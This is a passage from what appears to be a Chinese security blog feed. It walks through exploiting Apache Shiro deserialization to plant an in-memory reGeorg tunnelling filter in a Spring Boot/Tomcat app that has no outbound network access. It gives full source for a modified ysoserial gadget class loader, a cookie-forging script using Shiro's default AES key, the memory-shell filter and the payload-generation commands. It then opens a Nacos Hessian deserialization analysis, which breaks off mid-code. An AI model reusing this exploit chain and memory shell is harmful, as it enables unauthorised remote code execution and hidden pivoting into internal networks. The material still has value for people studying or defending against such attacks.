<h2 id="Shiro反序列化上载reGeorg代理"><a href="#Shiro反序列化上载reGeorg代理" class="headerlink" title="Shiro反序列化上载reGeorg代理"></a>Shiro反序列化上载reGeorg代理</h2><p>举个实际应用的例子，针对一个完全不出网的Spring Boot + Shiro程序如何进行内网渗透，这种情况下不能写Jsp马，而且不能出网自然不能作反弹Shell等操作，要进行内网渗透我觉得最好的方式就是动态注册filter或者servlet，并将reGeorg的代码嵌入其中，但如果将POC都写在header中，肯定会超过中间件header长度限制，当然在某些版本也有办法修改这个长度限制，参考<a href="https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&mid=2247484799&idx=1&sn=42e7807d6ea0d8917b45e8aa2e4dba44">基于全局储存的新思路 | Tomcat的一种通用回显方法研究</a>，如果采用上文中从外部加载字节码的方法那么这个问题就迎刃而解</p>
<h3 id="改造ysoserial"><a href="#改造ysoserial" class="headerlink" title="改造ysoserial"></a>改造ysoserial</h3><p>为了在ysoserial中正常使用下文中提到的类，需要先在pom.xml中加入如下依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.50<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>要让反序列化时运行指定的Java代码，需要借助TemplatesImpl，在ysoserial中新建一个类并继承AbstractTranslet，这里有不理解的可以参考<a href="https://l3yx.github.io/2020/02/22/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/#TemplatesImpl">有关TemplatesImpl的反序列化漏洞链</a></p>
<p>静态代码块中获取了Spring Boot上下文里的request，response和session，然后获取classData参数并通过反射调用defineClass动态加载此类，实例化后调用其中的equals方法传入request，response和session三个对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassLoader</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            javax.servlet.http.<span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();</span><br><span class="line">            java.lang.reflect.Field r=request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">            r.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            org.apache.catalina.connector.<span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span>((org.apache.catalina.connector.Request) r.get(request)).getResponse();</span><br><span class="line">            javax.servlet.http.<span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br><span class="line"></span><br><span class="line">            String classData=request.getParameter(<span class="string">&quot;classData&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">byte</span>[] classBytes = <span class="keyword">new</span> <span class="title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(classData);</span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class&#125;);</span><br><span class="line">            defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cc</span> <span class="operator">=</span> (Class) defineClassMethod.invoke(MyClassLoader.class.getClassLoader(), classBytes, <span class="number">0</span>,classBytes.length);</span><br><span class="line">            cc.newInstance().equals(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;request,response,session&#125;);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM arg0, SerializationHandler[] arg1)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM arg0, DTMAxisIterator arg1, SerializationHandler arg2)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>然后在ysoserial.payloads.util包的Gadgets类中照着原有的createTemplatesImpl方法添加一个createTemplatesImpl(Class c)，参数即为我们要让服务端加载的类，如下直接将传入的c转换为字节码赋值给了_bytecodes</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createTemplatesImpl</span><span class="params">(Class c)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Class&lt;T&gt; tplClass = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( Boolean.parseBoolean(System.getProperty(<span class="string">&quot;properXalan&quot;</span>, <span class="string">&quot;false&quot;</span>)) ) &#123;</span><br><span class="line">        tplClass = (Class&lt;T&gt;) Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        tplClass = (Class&lt;T&gt;) TemplatesImpl.class;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">T</span> <span class="variable">templates</span> <span class="operator">=</span> tplClass.newInstance();</span><br><span class="line">    <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = ClassFiles.classAsBytes(c);</span><br><span class="line"></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;</span><br><span class="line">        classBytes</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>最后复制CommonsBeanutils1.java的代码增加一个payload CommonsBeanutils1_ClassLoader.java，再把其中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br></pre></td></tr></table></figure>

<p>修改为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(ysoserial.MyClassLoader.class);</span><br></pre></td></tr></table></figure>



<p>打包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>



<p>借以下脚本生成POC</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="comment">#pip install pycrypto</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key  =  <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">mode =  AES.MODE_CBC</span><br><span class="line">IV   = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">encryptor = AES.new(base64.b64decode(key), mode, IV)</span><br><span class="line"></span><br><span class="line">payload=base64.b64decode(sys.argv[<span class="number">1</span>])</span><br><span class="line">BS   = AES.block_size</span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">payload=pad(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(IV + encryptor.encrypt(payload)))</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 shiro_cookie.py `java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1_ClassLoader anything |<span class="built_in">base64</span> |sed <span class="string">&#x27;:label;N;s/\n//;b label&#x27;</span>`</span><br></pre></td></tr></table></figure>



<h3 id="改造reGeorg"><a href="#改造reGeorg" class="headerlink" title="改造reGeorg"></a>改造reGeorg</h3><p>对于reGeorg服务端的更改其实也就是request等对象的获取方式，为了方便注册filter，我直接让该类实现了Filter接口，在doFilter方法中完成reGeorg的主要逻辑，在equals方法中进行filter的动态注册</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reGeorg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MemReGeorg</span> <span class="keyword">implements</span> <span class="title class_">javax</span>.servlet.Filter&#123;</span><br><span class="line">    <span class="keyword">private</span> javax.servlet.http.<span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> org.apache.catalina.connector.<span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> javax.servlet.http.<span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span><span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request1, ServletResponse response1, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        javax.servlet.http.<span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (javax.servlet.http.HttpServletRequest)request1;</span><br><span class="line">        javax.servlet.http.<span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> (javax.servlet.http.HttpServletResponse)response1;</span><br><span class="line">        javax.servlet.http.<span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;X-CMD&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            response.setHeader(<span class="string">&quot;X-STATUS&quot;</span>, <span class="string">&quot;OK&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd.compareTo(<span class="string">&quot;CONNECT&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">target</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;X-TARGET&quot;</span>);</span><br><span class="line">                    <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> Integer.parseInt(request.getHeader(<span class="string">&quot;X-PORT&quot;</span>));</span><br><span class="line">                    java.nio.channels.<span class="type">SocketChannel</span> <span class="variable">socketChannel</span> <span class="operator">=</span> java.nio.channels.SocketChannel.open();</span><br><span class="line">                    socketChannel.connect(<span class="keyword">new</span> <span class="title class_">java</span>.net.InetSocketAddress(target, port));</span><br><span class="line">                    socketChannel.configureBlocking(<span class="literal">false</span>);</span><br><span class="line">                    session.setAttribute(<span class="string">&quot;socket&quot;</span>, socketChannel);</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-STATUS&quot;</span>, <span class="string">&quot;OK&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (java.net.UnknownHostException e) &#123;</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-ERROR&quot;</span>, e.getMessage());</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-STATUS&quot;</span>, <span class="string">&quot;FAIL&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-ERROR&quot;</span>, e.getMessage());</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-STATUS&quot;</span>, <span class="string">&quot;FAIL&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd.compareTo(<span class="string">&quot;DISCONNECT&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                java.nio.channels.<span class="type">SocketChannel</span> <span class="variable">socketChannel</span> <span class="operator">=</span> (java.nio.channels.SocketChannel)session.getAttribute(<span class="string">&quot;socket&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    socketChannel.socket().close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">                session.invalidate();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd.compareTo(<span class="string">&quot;READ&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                java.nio.channels.<span class="type">SocketChannel</span> <span class="variable">socketChannel</span> <span class="operator">=</span> (java.nio.channels.SocketChannel)session.getAttribute(<span class="string">&quot;socket&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    java.nio.<span class="type">ByteBuffer</span> <span class="variable">buf</span> <span class="operator">=</span> java.nio.ByteBuffer.allocate(<span class="number">512</span>);</span><br><span class="line">                    <span class="type">int</span> <span class="variable">bytesRead</span> <span class="operator">=</span> socketChannel.read(buf);</span><br><span class="line">                    <span class="type">ServletOutputStream</span> <span class="variable">so</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">                    <span class="keyword">while</span> (bytesRead &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                        so.write(buf.array(),<span class="number">0</span>,bytesRead);</span><br><span class="line">                        so.flush();</span><br><span class="line">                        buf.clear();</span><br><span class="line">                        bytesRead = socketChannel.read(buf);</span><br><span class="line">                    &#125;</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-STATUS&quot;</span>, <span class="string">&quot;OK&quot;</span>);</span><br><span class="line">                    so.flush();</span><br><span class="line">                    so.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-ERROR&quot;</span>, e.getMessage());</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-STATUS&quot;</span>, <span class="string">&quot;FAIL&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd.compareTo(<span class="string">&quot;FORWARD&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                java.nio.channels.<span class="type">SocketChannel</span> <span class="variable">socketChannel</span> <span class="operator">=</span> (java.nio.channels.SocketChannel)session.getAttribute(<span class="string">&quot;socket&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">readlen</span> <span class="operator">=</span> request.getContentLength();</span><br><span class="line">                    <span class="type">byte</span>[] buff = <span class="keyword">new</span> <span class="title class_">byte</span>[readlen];</span><br><span class="line">                    request.getInputStream().read(buff, <span class="number">0</span>, readlen);</span><br><span class="line">                    java.nio.<span class="type">ByteBuffer</span> <span class="variable">buf</span> <span class="operator">=</span> java.nio.ByteBuffer.allocate(readlen);</span><br><span class="line">                    buf.clear();</span><br><span class="line">                    buf.put(buff);</span><br><span class="line">                    buf.flip();</span><br><span class="line">                    <span class="keyword">while</span>(buf.hasRemaining()) &#123;</span><br><span class="line">                        socketChannel.write(buf);</span><br><span class="line">                    &#125;</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-STATUS&quot;</span>, <span class="string">&quot;OK&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-ERROR&quot;</span>, e.getMessage());</span><br><span class="line">                    response.setHeader(<span class="string">&quot;X-STATUS&quot;</span>, <span class="string">&quot;FAIL&quot;</span>);</span><br><span class="line">                    socketChannel.socket().close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filterChain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        Object[] context=(Object[]) obj;</span><br><span class="line">        <span class="built_in">this</span>.session = (javax.servlet.http.HttpSession ) context[<span class="number">2</span>];</span><br><span class="line">        <span class="built_in">this</span>.response = (org.apache.catalina.connector.Response) context[<span class="number">1</span>];</span><br><span class="line">        <span class="built_in">this</span>.request = (javax.servlet.http.HttpServletRequest) context[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            dynamicAddFilter(<span class="keyword">new</span> <span class="title class_">MemReGeorg</span>(),<span class="string">&quot;reGeorg&quot;</span>,<span class="string">&quot;/*&quot;</span>,request);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">dynamicAddFilter</span><span class="params">(javax.servlet.Filter filter,String name,String url,javax.servlet.http.HttpServletRequest request)</span> <span class="keyword">throws</span> IllegalAccessException &#123;</span><br><span class="line">        javax.servlet.ServletContext servletContext=request.getServletContext();</span><br><span class="line">        <span class="keyword">if</span> (servletContext.getFilterRegistration(name) == <span class="literal">null</span>) &#123;</span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            org.apache.catalina.core.<span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span><span class="literal">null</span>;</span><br><span class="line">            org.apache.catalina.core.StandardContext standardContext=<span class="literal">null</span>;</span><br><span class="line">            java.lang.reflect.Field stateField=<span class="literal">null</span>;</span><br><span class="line">            javax.servlet.FilterRegistration.<span class="type">Dynamic</span> <span class="variable">filterRegistration</span> <span class="operator">=</span><span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                contextField=servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);</span><br><span class="line">                contextField=applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);</span><br><span class="line">                stateField=org.apache.catalina.util.LifecycleBase.class.getDeclaredField(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">                stateField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class="line">                filterRegistration = servletContext.addFilter(name, filter);</span><br><span class="line">                filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="literal">false</span>,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;url&#125;);</span><br><span class="line">                java.lang.reflect.<span class="type">Method</span> <span class="variable">filterStartMethod</span> <span class="operator">=</span> org.apache.catalina.core.StandardContext.class.getMethod(<span class="string">&quot;filterStart&quot;</span>);</span><br><span class="line">                filterStartMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                filterStartMethod.invoke(standardContext, <span class="literal">null</span>);</span><br><span class="line">                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                ;</span><br><span class="line">            &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>编译后使用如下命令得到其字节码的base64</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> MemReGeorg.class|<span class="built_in">base64</span> |sed <span class="string">&#x27;:label;N;s/\n//;b label&#x27;</span></span><br></pre></td></tr></table></figure>



<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>在Cookie处填入 rememberMe&#x3D;[ysoserial生成的POC]，POST包体填入classData&#x3D;[MemReGeorg类字节码的base64]，注意POST中参数需要URL编码，发包</p>
<p><img src="/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200703151537094.png" alt="image-20200703151537094"></p>
<p>然后带上<code>X-CMD:l3yx</code>header头再请求页面，返回<code>X-STATUS: OK</code>说明reGeorg已经正常工作</p>
<p><img src="/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200703151808170.png" alt="image-20200703151808170"></p>
<p>reGeorg客户端也需要修改一下，原版会先GET请求一下网页判断是否是reGeorg的jsp页面，由于这里是添加了一个filter，正常访问网页是不会有变化的，只有带上相关头才会进入reGeorg代码，所以需要将客户端中相关的验证去除</p>
<p>在askGeorg函数第一行增加return True即可</p>
<p><img src="/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200703150835555.png" alt="image-20200703150835555"></p>
<p>连接reGeorg</p>
<p><img src="/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200703151936423.png" alt="image-20200703151936423"></p>
<p><img src="/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200703152027686.png" alt="image-20200703152027686"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/2744">https://xz.aliyun.com/t/2744</a></p>
<p><a href="https://xz.aliyun.com/t/7388">https://xz.aliyun.com/t/7388</a></p>
]]></content>
      <tags>
        <tag>Java</tag>
        <tag>ysoserial</tag>
      </tags>
  </entry>
  <entry>
    <title>Nacos Raft Hessian反序列化漏洞分析</title>
    <url>/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>Nacos默认的7848端口是用于Nacos集群间Raft协议的通信，该端口的服务在处理部分Jraft请求时会使用Hessian进行反序列化</p>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li><p>1.4.0 &lt;&#x3D; Nacos &lt; 1.4.6</p>
</li>
<li><p>2.0.0 &lt;&#x3D; Nacos &lt; 2.2.3</p>
</li>
</ul>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="grpc-java"><a href="#grpc-java" class="headerlink" title="grpc-java"></a>grpc-java</h3><p>作为分析该漏洞的前置知识，需要对照<a href="https://grpc.io/docs/languages/java/basics/">官方文档</a>快速学一下（搜了一些教程，但讲的版本比较老了，很多不兼容的地方，Nacos用的是比较新的版本，所以还是以官方教程学习靠谱）</p>
<h4 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h4><p>创建Maven项目 grpc_demo，依赖参考官方<a href="https://github.com/grpc/grpc-java">README</a></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.grpc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>grpc-netty-shaded<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.50.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.grpc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>grpc-protobuf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.50.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.grpc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>grpc-stub<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.50.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--运行服务端需要--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 